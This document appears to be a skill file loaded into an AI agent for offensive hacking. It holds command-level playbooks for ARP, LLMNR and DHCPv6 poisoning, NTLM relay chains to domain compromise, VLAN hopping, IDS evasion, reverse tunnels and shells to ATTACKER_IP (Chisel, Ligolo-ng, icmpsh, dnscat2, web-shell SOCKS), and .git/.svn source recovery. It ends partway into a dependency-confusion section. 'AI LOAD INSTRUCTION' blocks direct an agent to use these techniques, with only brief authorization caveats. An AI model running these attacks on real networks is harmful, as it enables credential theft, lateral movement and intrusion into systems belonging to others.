---
name: infra-network
description: >-
  Network infrastructure attacks. Covers network protocol attacks (ARP/LLMNR/NBT-NS/mDNS poisoning/DHCPv6/VLAN hopping/802.1Q double-tag), tunneling & pivoting (SSH/Chisel/Ligolo-ng/iodine DNS/ICMP/Neo-reGeorg), insecure source code management (.git/.svn recovery), dependency confusion (npm/pip/gem registry hijack), and WebSocket security (CSWSH/Origin bypass). Load when pivoting through networks or exploiting infrastructure services.
---

<!-- src: hacker/.claude/skills/infra-network/SKILL.md -->

# Network Infrastructure Attacks

## Internal Navigation
| Part | Content |
|---|---|
| 1 | Network Protocol Attacks |
| 2 | Name Resolution Poisoning |
| 3 | Tunneling & Pivoting |
| 4 | Insecure Source Code Management |
| 5 | Dependency Confusion |
| 6 | WebSocket Security |

---
# Part 1: Network Protocol Attacks


# SKILL: Network Protocol Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert network protocol attack techniques. Covers ARP spoofing, name resolution poisoning (LLMNR/NBT-NS/mDNS), WPAD abuse, DHCPv6 takeover, VLAN hopping, STP manipulation, DNS spoofing, IPv6 attacks, and IDS/IPS evasion. Base models miss the chaining opportunities between these attacks and the nuances of modern switched network exploitation.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) after establishing MitM position for traffic redirection
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for relaying captured NTLM hashes from poisoning attacks
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting services discovered during network attacks
- [traffic-analysis-pcap](../traffic-analysis-pcap/SKILL.md) for analyzing captured traffic from MitM

### Advanced Reference

Also load [NAME_RESOLUTION_POISONING.md](./NAME_RESOLUTION_POISONING.md) when you need:
- Detailed Responder/mitm6 configuration and workflows
- NTLM relay target selection and chaining
- Credential format analysis and cracking priorities


## 1. ARP SPOOFING

### Gratuitous ARP — MitM Positioning

```bash
# arpspoof (dsniff suite)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &

# ettercap — ARP poisoning with sniffing
ettercap -T -q -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//

# bettercap — modern framework
bettercap -iface eth0
> set arp.spoof.targets VICTIM_IP
> arp.spoof on
> net.sniff on
```

### Selective Targeting

```bash
# bettercap — target specific hosts, avoid detection
> set arp.spoof.targets 10.0.0.50,10.0.0.51
> set arp.spoof.fullduplex true
> set arp.spoof.internal true
> arp.spoof on
```

### Detection Indicators

- Duplicate MAC addresses in ARP table
- Gratuitous ARP storms from non-gateway IPs
- Tools: `arpwatch`, static ARP entries, 802.1X port authentication

---

## 2. LLMNR / NBT-NS / mDNS POISONING

### Responder — Credential Capture

```bash
# Basic poisoning (LLMNR + NBT-NS + mDNS)
responder -I eth0 -dwPv

# Key flags:
# -d  Enable answers for DHCP broadcast requests (fingerprinting)
# -w  Start WPAD rogue proxy
# -P  Force NTLM auth for WPAD
# -v  Verbose

# Analyze mode only (passive, no poisoning)
responder -I eth0 -A
```

### Captured Hash Formats

| Protocol | Hash Type | Hashcat Mode | Crackability |
|---|---|---|---|
| NTLMv1 | NetNTLMv1 | 5500 | Fast — rainbow tables viable |
| NTLMv2 | NetNTLMv2 | 5600 | Moderate — dictionary + rules |
| NTLMv1-ESS | NetNTLMv1 | 5500 | Fast — same as NTLMv1 |

```bash
# Crack captured hashes
hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule
john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt
```

### Relay Instead of Crack

```bash
# ntlmrelayx — relay captured NTLM to other services
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldaps://DC01 --delegate-access    # RBCD attack
ntlmrelayx.py -t mssql://DB01 -q "exec xp_cmdshell 'whoami'"
```

---

## 3. WPAD ABUSE

```bash
# Responder with WPAD proxy
responder -I eth0 -wPv

# WPAD flow:
# 1. Client queries DHCP for WPAD → DNS for wpad.domain.com → LLMNR/NBT-NS
# 2. Responder answers with rogue wpad.dat
# 3. Browser uses attacker's proxy → forced NTLM auth → credential capture
```

### Manual WPAD PAC File

```javascript
// Rogue wpad.dat content
function FindProxyForURL(url, host) {
    return "PROXY ATTACKER_IP:3128; DIRECT";
}
```

---

## 4. DHCPv6 ATTACK — mitm6

Even on IPv4-only networks, Windows clients send DHCPv6 solicitations by default.

```bash
# mitm6 → DNS takeover → NTLM relay
mitm6 -d domain.com

# In parallel: relay captured NTLM to LDAP(S) for delegation
ntlmrelayx.py -6 -t ldaps://DC01 -wh fakewpad.domain.com -l loot --delegate-access

# Attack chain:
# 1. mitm6 answers DHCPv6 → sets attacker as IPv6 DNS
# 2. Victim DNS queries go to attacker → WPAD redirect
# 3. Forced NTLM auth → relay to LDAP → create machine account or RBCD
```

### Key Conditions

- SMB signing disabled on targets (for SMB relay)
- LDAP signing not enforced on DC (for LDAP relay)
- Domain Computers quota > 0 (for machine account creation, default: 10)

---

## 5. VLAN HOPPING

### Switch Spoofing (DTP)

```bash
# yersinia — DTP attack to negotiate trunk
yersinia dtp -attack 1 -interface eth0

# frogger.sh — automated VLAN hopping via DTP
./frogger.sh
# Sends DTP frames → switch enables trunking → access all VLANs

# After trunk established:
modprobe 8021q
vconfig add eth0 TARGET_VLAN
ifconfig eth0.TARGET_VLAN 10.10.10.1 netmask 255.255.255.0 up
```

### Double Tagging (802.1Q)

```bash
# Craft double-tagged frame: outer=native VLAN, inner=target VLAN
# scapy:
from scapy.all import *
pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="TARGET")/ICMP()
sendp(pkt, iface="eth0")

# Limitation: one-way only (responses go to real gateway)
# Effective for blind attacks (e.g., targeting a server)
```

### Mitigation

- Disable DTP: `switchport nonegotiate`
- Set native VLAN to unused: `switchport trunk native vlan 999`
- Prune VLANs: only allow needed VLANs on trunk ports

---

## 6. STP MANIPULATION

### Root Bridge Claim

```bash
# yersinia — claim root bridge with lowest priority
yersinia stp -attack 4 -interface eth0

# Send BPDUs with priority 0 → become root bridge
# All traffic flows through attacker → MitM
```

### Topology Change Attack

```bash
# Send TC (Topology Change) BPDUs → force MAC table flush
yersinia stp -attack 1 -interface eth0
# Switches flood all ports temporarily → sniff traffic
```

### Mitigation

- BPDU Guard on access ports
- Root Guard on designated ports
- `spanning-tree portfast bpduguard enable`

---

## 7. DNS SPOOFING

### DNS Cache Poisoning

```bash
# bettercap DNS spoofing
bettercap -iface eth0
> set dns.spoof.domains target.com, *.target.com
> set dns.spoof.address ATTACKER_IP
> dns.spoof on

# ettercap DNS spoofing (via etter.dns config)
echo "target.com A ATTACKER_IP" >> /etc/ettercap/etter.dns
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /VICTIM// /GATEWAY//
```

### Kaminsky Attack Variant

Flood recursive resolver with forged responses for random subdomains, each including a malicious authority section pointing the NS record to attacker-controlled server.

---

## 8. IPv6 ATTACKS

### Router Advertisement Spoofing

```bash
# Send rogue RA → victim configures attacker as default gateway
atk6-fake_router6 eth0 ATTACKER_IPV6_PREFIX/64

# THC-IPv6 suite for comprehensive IPv6 attacks
atk6-parasite6 eth0     # ICMPv6 neighbor spoofing
atk6-redir6 eth0 ...    # Traffic redirection via ICMPv6 redirect
```

### SLAAC Abuse

```bash
# Advertise rogue prefix → victim auto-configures IPv6 address
# Combined with rogue DNS (RA option) → full MitM over IPv6
# Windows prioritizes IPv6 over IPv4 by default
```

---

## 9. IDS/IPS EVASION

| Technique | Method | Tool/Flag |
|---|---|---|
| IP Fragmentation | Split payload across fragments | `nmap -f`, `fragroute` |
| TTL Manipulation | Set TTL to expire at IDS but reach target | `fragroute` |
| Encoding Evasion | URL/Unicode/hex encoding | Manual, custom scripts |
| Session Splicing | Split TCP payload across segments | `fragroute`, `nmap --data-length` |
| Timing-Based | Slow scan to avoid rate-based detection | `nmap -T0`, `nmap -T1` |
| Decoy Scanning | Mix real scan with decoy source IPs | `nmap -D RND:10` |
| Idle/Zombie Scan | Use idle host as scan proxy | `nmap -sI ZOMBIE_IP` |

```bash
# fragroute — fragment and reorder packets
echo "ip_frag 8" > /tmp/frag.conf
echo "order random" >> /tmp/frag.conf
fragroute -f /tmp/frag.conf TARGET_IP

# nmap evasion combinations
nmap -sS -f --mtu 24 --data-length 50 -D RND:5 -T2 TARGET
```

---

## 10. DECISION TREE

```
Network access obtained — want to escalate via network attacks
│
├── On same broadcast domain as targets?
│   ├── YES → ARP spoof for MitM (§1)
│   │   └── Capture plaintext creds or redirect traffic
│   └── NO → need VLAN hopping first (§5)
│       ├── DTP enabled? → switch spoofing
│       └── Know native VLAN? → double tagging
│
├── Windows environment?
│   ├── LLMNR/NBT-NS enabled? (default YES)
│   │   └── Run Responder (§2) → capture NetNTLM hashes
│   │       ├── NTLMv1? → crack fast or relay
│   │       └── NTLMv2? → relay (§2) or crack with rules
│   │
│   ├── WPAD configured or auto-detect? → WPAD abuse (§3)
│   │
│   └── IPv6 not hardened? (default) → mitm6 + ntlmrelayx (§4)
│       └── LDAP relay → RBCD → domain compromise
│
├── Need DNS control?
│   ├── MitM already established? → DNS spoofing (§7)
│   └── DHCPv6 available? → mitm6 for DNS takeover (§4)
│
├── Managed switches with weak config?
│   ├── BPDU Guard off? → STP root bridge claim (§6)
│   └── DTP enabled? → VLAN hopping (§5)
│
├── IPv6 attack surface?
│   └── RA spoofing / SLAAC abuse (§8) → MitM over IPv6
│
└── IDS/IPS in path?
    └── Apply evasion techniques (§9) — fragmentation, timing, encoding
```


---
# Part 2: Name Resolution Poisoning


# NAME RESOLUTION POISONING — Responder & mitm6 Deep Dive

> Supplementary reference for [network-protocol-attacks](./SKILL.md) §2–§4. Load when you need detailed Responder configuration, relay chaining, or credential format analysis.


## 1. RESPONDER CONFIGURATION

### Core Config — `/opt/Responder/Responder.conf`

```ini
[Responder Core]
; Turn specific servers on/off
SQL      = On
SMB      = On
RDP      = On
Kerberos = On
FTP      = On
POP      = On
SMTP     = On
IMAP     = On
HTTP     = On
HTTPS    = On
DNS      = On
LDAP     = On
DCERPC   = On
WinRM    = On

; Authentication type
; For relay: use Off for SMB and HTTP to avoid capturing (let ntlmrelayx handle it)
; For capture: keep On

[HTTP Server]
; Challenge to use for HTTP NTLM
Challenge = Random
```

### Responder for Capture Mode

```bash
# Full capture — all protocols
responder -I eth0 -dwPv

# Output: /opt/Responder/logs/
# Files: HTTP-NTLMv2-CLIENT_IP.txt, SMB-NTLMv2-CLIENT_IP.txt, etc.
# Format: USER::DOMAIN:challenge:response:blob
```

### Responder for Relay Mode

```bash
# Disable SMB and HTTP servers in Responder.conf (let ntlmrelayx handle auth)
# Responder.conf: SMB = Off, HTTP = Off

responder -I eth0 -dwPv

# In parallel terminal:
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 2. RELAY TARGET SELECTION

### Identify Targets Without SMB Signing

```bash
# CrackMapExec — find hosts with SMB signing disabled
crackmapexec smb SUBNET/24 --gen-relay-list targets.txt
# Output: targets.txt with IPs where signing is not required

# Nmap
nmap -p 445 --script smb2-security-mode SUBNET/24
# Look for: "Message signing enabled but not required"
```

### Relay Targets by Protocol

| Relay Target | Requirement | Command | Impact |
|---|---|---|---|
| SMB | Signing not required | `ntlmrelayx.py -tf targets.txt` | Code execution if admin |
| LDAP(S) | Signing not enforced on DC | `ntlmrelayx.py -t ldaps://DC` | Modify AD objects, RBCD |
| MSSQL | No EPA | `ntlmrelayx.py -t mssql://DB -q "QUERY"` | SQL execution |
| HTTP(S) | NTLM auth accepted | `ntlmrelayx.py -t http://TARGET/endpoint` | Web action as victim |
| IMAP | NTLM auth | `ntlmrelayx.py -t imap://EXCHANGE` | Email access |
| SMTP | NTLM auth | `ntlmrelayx.py -t smtp://EXCHANGE` | Send email as victim |

### High-Value Relay Chains

```bash
# Chain 1: Responder → ntlmrelayx → LDAP → RBCD → silver ticket
ntlmrelayx.py -t ldaps://DC01 --delegate-access
# Creates machine account, sets RBCD → use getST.py for service ticket

# Chain 2: Responder → ntlmrelayx → LDAP → shadow credentials
ntlmrelayx.py -t ldaps://DC01 --shadow-credentials --shadow-target TARGET$

# Chain 3: Responder → ntlmrelayx → ADCS → certificate
ntlmrelayx.py -t http://CA01/certsrv/certfnsh.asp --adcs --template DomainController

# Chain 4: mitm6 → ntlmrelayx → LDAP → delegate
mitm6 -d domain.com &
ntlmrelayx.py -6 -t ldaps://DC01 -wh fakewpad.domain.com --delegate-access
```

---

## 3. CREDENTIAL FORMAT ANALYSIS

### NetNTLMv1 Hash

```
user::DOMAIN:LM_RESPONSE:NTLM_RESPONSE:SERVER_CHALLENGE
```

- Hashcat mode: `5500`
- Can be downgraded if Responder uses a fixed challenge (`1122334455667788`)
- With fixed challenge → crack via `crack.sh` / rainbow tables instantly

```bash
# Force NTLMv1 downgrade (Responder.conf):
Challenge = 1122334455667788

# Then submit to crack.sh or use rainbow tables
# NTLMv1 with ESS: extract the real NT hash via DES cracking
```

### NetNTLMv2 Hash

```
user::DOMAIN:SERVER_CHALLENGE:NTProofStr:BLOB
```

- Hashcat mode: `5600`
- Cannot use rainbow tables (includes random client challenge)
- Requires dictionary + rules attack

```bash
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule
```

### Cracking Priority

```
1. NTLMv1 (mode 5500) → crack first, fastest
2. NTLMv1-ESS with fixed challenge → crack.sh for free
3. NTLMv2 (mode 5600) → dictionary + rules
4. If cracking fails → relay instead of crack
```

---

## 4. mitm6 DETAILED WORKFLOW

### Prerequisites

```bash
pip install mitm6
# Requires: scapy, twisted, ldap3
```

### Attack Flow

```
Step 1: mitm6 sends DHCPv6 replies → victim gets IPv6 + attacker as DNS
Step 2: Victim DNS queries (IPv6) go to attacker
Step 3: Attacker returns WPAD config → forces NTLM auth
Step 4: ntlmrelayx captures NTLM and relays to target
```

```bash
# Terminal 1: mitm6
mitm6 -d domain.com -i eth0

# Terminal 2: ntlmrelayx with LDAP relay
ntlmrelayx.py -6 -t ldaps://DC01.domain.com -wh fakewpad.domain.com -l lootdir

# -6       : listen on IPv6
# -wh      : WPAD host to inject
# -l       : loot directory for dumped data
# --delegate-access : create machine account + set RBCD
```

### Post-Exploitation After Successful Relay

```bash
# If --delegate-access succeeded:
# 1. Get service ticket via RBCD
getST.py -spn cifs/TARGET.domain.com -impersonate administrator \
    domain.com/'MACHINE$':'PASSWORD' -dc-ip DC_IP

# 2. Use ticket
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass TARGET.domain.com
```

---

## 5. TROUBLESHOOTING

| Issue | Cause | Fix |
|---|---|---|
| No hashes captured | LLMNR/NBT-NS disabled via GPO | Try mitm6 (DHCPv6 is harder to disable) |
| Only machine accounts | Machines query more than users | Wait, trigger user queries (e.g., phish link to `\\attacker\share`) |
| Relay fails "signing required" | Target enforces SMB signing | Relay to LDAP/HTTP/MSSQL instead |
| mitm6 no response | IPv6 disabled on target | Fall back to LLMNR/WPAD |
| NTLMv2 won't crack | Strong password | Use relay, don't waste time cracking |
| Responder conflicts | Another LLMNR responder on network | Check for legitimate WPAD/LLMNR, use `-A` mode first |

---

## 6. OPSEC CONSIDERATIONS

- Run Responder in analyze mode (`-A`) first to assess traffic
- Limit poisoning to specific targets to reduce noise
- Use `--lm` flag in Responder only if NTLMv1 downgrade is needed
- mitm6 affects all hosts on segment — use `-hw` to filter targets
- Clean up DHCPv6 leases after attack (they persist ~300 seconds)
- Monitor for AV/EDR alerting on tool signatures


---
# Part 3: Tunneling & Pivoting


# SKILL: Tunneling & Pivoting — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert tunneling and pivoting techniques. Covers SSH port forwarding (local/remote/dynamic/jump), Chisel reverse SOCKS, Ligolo-ng transparent TUN pivoting, socat relays, DNS/ICMP/HTTP tunneling, ProxyChains configuration, Windows pivoting (netsh/plink), and multi-layer chaining. Base models miss egress-aware tool selection and transparent routing setup.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [network-protocol-attacks](../network-protocol-attacks/SKILL.md) for network-level attacks from pivot positions
- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) for establishing initial access shells
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting services discovered through pivots
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) or [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) after pivoting to new hosts


## 1. SSH TUNNELING

### Local Port Forward

Forward a local port to a remote service through the pivot.

```bash
# Access INTERNAL_HOST:3306 via localhost:3306
ssh -L 3306:INTERNAL_HOST:3306 user@PIVOT -N

# Access internal web app
ssh -L 8080:10.10.10.100:80 user@PIVOT -N
# Browse: http://localhost:8080

# Bind to all interfaces (share with teammates)
ssh -L 0.0.0.0:8080:INTERNAL:80 user@PIVOT -N
```

### Remote Port Forward

Expose a local service to the pivot host's network.

```bash
# Make attacker's port 8000 accessible on pivot as pivot:9000
ssh -R 9000:127.0.0.1:8000 user@PIVOT -N

# Expose attacker's listener to internal network
ssh -R 0.0.0.0:4444:127.0.0.1:4444 user@PIVOT -N
# Internal hosts connect to PIVOT:4444 → reaches attacker:4444
```

### Dynamic Port Forward (SOCKS Proxy)

```bash
# Create SOCKS4/5 proxy on localhost:1080
ssh -D 1080 user@PIVOT -N

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn -p 80,443,445 INTERNAL_SUBNET/24

# Or with browser SOCKS proxy → browse internal web apps
```

### Jump Host (ProxyJump)

```bash
# Single jump
ssh -J jumphost user@TARGET

# Multiple jumps
ssh -J jump1,jump2 user@TARGET

# SSH config for persistent jump
# ~/.ssh/config
Host internal-target
    HostName 10.10.10.100
    User admin
    ProxyJump user@jumphost.example.com
```

---

## 2. CHISEL

### Reverse SOCKS Proxy (Most Common)

```bash
# Attacker: start chisel server
chisel server --reverse --port 8080

# Victim: connect back as client, create reverse SOCKS
chisel client ATTACKER_IP:8080 R:socks

# Result: SOCKS5 proxy on attacker's 127.0.0.1:1080
proxychains nmap -sT -Pn INTERNAL/24
```

### Port Forwarding

```bash
# Forward specific port
chisel client ATTACKER:8080 R:3306:INTERNAL_DB:3306

# Multiple forwards
chisel client ATTACKER:8080 R:3306:DB:3306 R:8080:WEB:80

# Reverse port forward (expose attacker service to victim network)
chisel client ATTACKER:8080 R:0.0.0.0:4444:127.0.0.1:4444
```

---

## 3. LIGOLO-NG

TUN interface-based pivoting — transparent routing without SOCKS.

```bash
# Attacker: start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Agent (victim): connect to proxy
ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo-proxy console:
>> session                    # select agent session
>> ifconfig                   # view agent's network interfaces
>> start                      # start tunnel

# Add routes on attacker to reach internal networks
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo
```

### Listener (Reverse Shell Catcher Through Pivot)

```bash
# In ligolo-proxy console:
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Internal hosts connecting to AGENT:4444 → forwarded to attacker:4444
```

### Double Pivot

```bash
# Agent 1 on DMZ → tunnel to internal network 1
# Agent 2 on internal network 1 → tunnel to internal network 2
# Add routes for both networks on attacker
sudo ip route add 10.0.0.0/24 dev ligolo    # via agent 1
sudo ip route add 172.16.0.0/24 dev ligolo  # via agent 2
```

---

## 4. SOCAT

```bash
# TCP port forward
socat TCP-LISTEN:8080,fork TCP:INTERNAL:80

# UDP relay
socat UDP-LISTEN:53,fork UDP:INTERNAL_DNS:53

# Encrypted tunnel
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:INTERNAL:80

# File transfer via socat
# Receiver:
socat TCP-LISTEN:9999,fork file:received_file,create
# Sender:
socat TCP:RECEIVER:9999 file:send_file
```

---

## 5. PROXYCHAINS / PROXIFIER

### ProxyChains Configuration

```ini
# /etc/proxychains4.conf
strict_chain          # fail if any proxy is down
# dynamic_chain       # skip dead proxies
# random_chain        # randomize proxy order

[ProxyList]
socks5 127.0.0.1 1080        # first hop (SSH dynamic forward)
socks5 127.0.0.1 1081        # second hop (if chaining)
```

```bash
# Usage
proxychains nmap -sT -Pn -p 22,80,445 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.50 -u admin -p pass
```

---

## 6. WINDOWS PIVOTING

### Netsh Port Forwarding

```cmd
:: Forward port (requires admin)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_IP

:: List forwards
netsh interface portproxy show all

:: Remove
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Plink (PuTTY CLI)

```cmd
:: Dynamic SOCKS (like ssh -D)
plink.exe -ssh -D 1080 -N user@ATTACKER

:: Remote port forward
plink.exe -ssh -R 4444:127.0.0.1:4444 user@ATTACKER

:: Automated (non-interactive, accept host key)
echo y | plink.exe -ssh -l user -pw password -R 9050:127.0.0.1:9050 ATTACKER
```

---

## 7. DNS TUNNELING

```bash
# iodine — IP-over-DNS
# Server (attacker, with NS record pointing to attacker):
iodined -f -c -P password 10.0.0.1 t1.yourdomain.com

# Client (victim):
iodine -f -P password t1.yourdomain.com
# Creates dns0 interface → route traffic through it

# dnscat2 — command channel over DNS
# Server:
ruby dnscat2.rb yourdomain.com
# Client:
./dnscat --dns=server=ATTACKER,port=53 --secret=SHARED_SECRET
```

---

## 8. ICMP TUNNELING

```bash
# icmpsh — ICMP reverse shell (no raw socket on victim needed for Windows)
# Attacker:
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py ATTACKER_IP VICTIM_IP

# Victim (Windows):
icmpsh.exe -t ATTACKER_IP

# ptunnel-ng — TCP-over-ICMP
# Server:
ptunnel-ng -r INTERNAL_HOST -R 22
# Client:
ptunnel-ng -p PIVOT_IP -l 2222 -r INTERNAL_HOST -R 22
ssh -p 2222 user@127.0.0.1
```

---

## 9. HTTP TUNNELING

```bash
# Neo-reGeorg — SOCKS proxy via web shell
# Generate tunnel web shell:
python3 neoreg.py generate -k PASSWORD

# Upload tunnel.php/aspx/jsp to target web server

# Connect:
python3 neoreg.py -k PASSWORD -u http://TARGET/tunnel.php
# SOCKS proxy on 127.0.0.1:1080

# Tunna — HTTP tunnel (alternative)
python2 proxy.py -u http://TARGET/conn.php -l 4444 -r 3389 -a INTERNAL_IP
```

---

## 10. PIVOTING DECISION MATRIX

| Egress Allowed | Tool | Notes |
|---|---|---|
| TCP outbound (any port) | Chisel, Ligolo-ng, SSH | Fastest setup |
| TCP 80/443 only | Chisel (HTTP/S), Neo-reGeorg | Blend with web traffic |
| DNS only (53/udp) | iodine, dnscat2 | Slow but stealthy |
| ICMP only | ptunnel-ng, icmpsh | Very restricted environments |
| No outbound | Bind shell + port forward in | Needs inbound access to pivot |
| Web shell only | Neo-reGeorg, Tunna | When only HTTP file upload works |

---

## 11. DECISION TREE

```
Compromised host — need to reach internal network
│
├── Can install tools on pivot?
│   ├── YES + outbound TCP allowed?
│   │   ├── Need transparent routing? → Ligolo-ng (§3)
│   │   ├── Need SOCKS proxy? → Chisel reverse SOCKS (§2)
│   │   └── SSH available? → SSH dynamic forward (§1)
│   │
│   ├── YES + only HTTP(S) outbound?
│   │   ├── Chisel over HTTPS (§2)
│   │   └── Upload web tunnel → Neo-reGeorg (§9)
│   │
│   ├── YES + only DNS outbound?
│   │   └── iodine or dnscat2 (§7)
│   │
│   └── YES + only ICMP allowed?
│       └── ptunnel-ng or icmpsh (§8)
│
├── Cannot install tools (web shell only)?
│   └── Neo-reGeorg / Tunna via web shell (§9)
│
├── Windows pivot?
│   ├── Admin access? → netsh portproxy (§6)
│   ├── SSH client available? → ssh.exe (Windows 10+) (§1)
│   └── Outbound SSH? → plink (§6)
│
├── Need multi-layer pivot?
│   ├── Ligolo-ng: multiple agents + route stacking (§3)
│   ├── SSH ProxyJump chaining (§1)
│   └── ProxyChains with multiple SOCKS (§5)
│
└── Teammate needs access too?
    ├── Bind SOCKS on 0.0.0.0 (ssh -L 0.0.0.0:...)
    └── Share Ligolo-ng routes via common proxy
```


---
# Part 4: Insecure Source Code Management


# SKILL: Insecure Source Code Management

> **AI LOAD INSTRUCTION**: This skill covers detection and recovery of exposed version-control metadata, common backup artifacts, and related misconfigurations. Use only in **authorized** assessments. Treat recovered credentials and URLs as sensitive; do not exfiltrate real data beyond scope. For broad discovery workflow, cross-load [recon-for-sec](../recon-for-sec/SKILL.md) and [recon-and-methodology](../recon-and-methodology/SKILL.md) when those skills exist in the workspace.

## 0. QUICK START

High-value paths to probe first (GET or HEAD, respect rate limits):

```http
/.git/HEAD
/.git/config
/.svn/entries
/.svn/wc.db
/.hg/requires
/.bzr/README
/.DS_Store
/.env
```

**Routing note**: quickly probe these paths first; for full recon workflow, load methodology from `recon-for-sec` and `recon-and-methodology` before deeper testing.


## 1. GIT EXPOSURE

### Detection

- **`/.git/HEAD`** — valid repo often returns plain text like:

```text
ref: refs/heads/main
```

- **`/.git/config`** — may expose `remote.origin.url`, user identity, or embedded credentials.
- **`/.git/index`**, **`/.git/objects/`** — partial object store access enables reconstruction with the right tools.

### 403 vs 404

- **`404`** — path likely absent or fully blocked at the edge.
- **`403` on `/.git/`** — directory may **exist** but listing is denied; still try direct file URLs:

```http
/.git/HEAD
/.git/config
/.git/logs/HEAD
/.git/refs/heads/main
```

A **403 on the directory** plus **200 on `HEAD`** strongly indicates exposure.

### Recovery tools (open source)

- **`arthaud/git-dumper`** — dumps reachable `.git` tree when individual files are fetchable.
- **`internetwache/GitTools`** — Dumper, Extractor, Finder modules for partial/corrupt dumps.
- **`WangYihang/GitHacker`** — alternative recovery when standard dumpers miss edge cases.

### Key files to prioritize

| Path | Why it matters |
|------|----------------|
| `.git/config` | Remotes, credentials, hooks paths |
| `.git/logs/HEAD` | Commit history, reflog-style leakage |
| `.git/refs/heads/*` | Branch tips, commit SHAs |
| `.git/packed-refs` | Packed branch/tag refs |
| `.git/objects/**` | Object blobs for reconstruction |

---

## 2. SVN EXPOSURE

### Detection

- **SVN before 1.7**: **`/.svn/entries`** — XML or text metadata listing paths and revisions.
- **SVN ≥ 1.7**: **`/.svn/wc.db`** — SQLite working copy database (`PRAGMA table_info` after download).

Example probe:

```http
GET /.svn/entries HTTP/1.1
GET /.svn/wc.db HTTP/1.1
```

### Recovery

- **`anantshri/svn-extractor`** — automated extraction from exposed `.svn`.
- **Manual**: download `wc.db`, query with `sqlite3` for file paths and checksums, then request **`/.svn/pristine/`** blobs if exposed.

---

## 3. MERCURIAL EXPOSURE

### Detection

- **`/.hg/requires`** — small text file listing repository features; confirms Mercurial metadata.

```http
GET /.hg/requires HTTP/1.1
GET /.hg/store/ HTTP/1.1
```

### Recovery

- **`sahildhar/mercurial_source_code_dumper`** — dumps repository when store paths are reachable.

---

## 4. OTHER LEAKS

### Bazaar (Bzr)

- Probe **`/.bzr/README`** and **`/.bzr/branch-format`** for Bazaar metadata.

### macOS `.DS_Store`

- **`/.DS_Store`** can encode directory and filename listings.
- Tools: **`gehaxelt/ds-store`**, **`lijiejie/ds_store_exp`** — parse `.DS_Store` offline.

### Backup and config artifacts

Probe (adjust for app root and naming conventions):

```text
/.env
/backup.zip
/backup.tar.gz
/wwwroot.rar
/backup.sql
/config.php.bak
/.config.php.swp
```

### Web server misconfiguration signal (example: NGINX)

- **`location /.git { deny all; }`** — may return **403** for `/.git/` while still allowing or denying specific subpaths depending on rules.
- **403 on a protected location** can **confirm the route exists**; always distinguish from **404** on non-existent paths.

---

## 5. DECISION TREE

1. **Probe `/.git/HEAD`** → `ref: refs/heads/` pattern? → run **git-dumper / GitTools / GitHacker**; review `config` and `logs/HEAD` for secrets.
2. **Else probe `/.svn/wc.db` or `entries`** → success? → **svn-extractor** or manual `wc.db` + pristine recovery.
3. **Else probe `/.hg/requires`** → success? → **mercurial dumper**.
4. **Else probe `/.bzr/README`** → Bazaar tooling or manual path walk.
5. **Parallel**: fetch **`/.DS_Store`**, **`/.env`**, common **backup extensions** on app root and parent paths.
6. **Interpret status codes**: **403 on directory** + **200 on specific files** → treat as **high priority** for file-by-file extraction.

---

## 6. RELATED ROUTING

- From **[recon-for-sec](../recon-for-sec/SKILL.md)** — scope-safe discovery, crawling, and fingerprinting before deep VCS tests.
- From **[recon-and-methodology](../recon-and-methodology/SKILL.md)** — structured methodology and evidence handling.

**Note**: coordinate with recon skills—set scope and request rate first, then run targeted VCS/backup validation.


---
# Part 5: Dependency Confusion


# SKILL: Dependency Confusion — Supply Chain Attack Playbook

> **AI LOAD INSTRUCTION**: Expert dependency-confusion methodology. Covers how private package names leak, how public registries can win version resolution, ecosystem-specific pitfalls (npm scopes, pip extra indexes, Maven repo order), recon commands, non-destructive PoC patterns (callbacks, not data exfil), and defensive controls. Pair with supply-chain recon workflows when manifests or CI caches are in scope. **Only use on systems and programs you are authorized to test.**

## 0. QUICK START

**What to look for first**

- **Manifests** listing package names that look **internal** (short unscoped names, org-specific tokens, product codenames) without a **hard-private registry lock**.
- Evidence the **same name** might exist—or be **squattable**—on a **public** registry with a **higher semver** than the private feed publishes.
- **Lockfiles** missing, stale, or not enforced in CI so `install`/`build` can drift toward public metadata.

**Fast mental model**: *If the resolver can see both private and public indexes, and version ranges allow it, the “newest” matching version may be the attacker’s.*

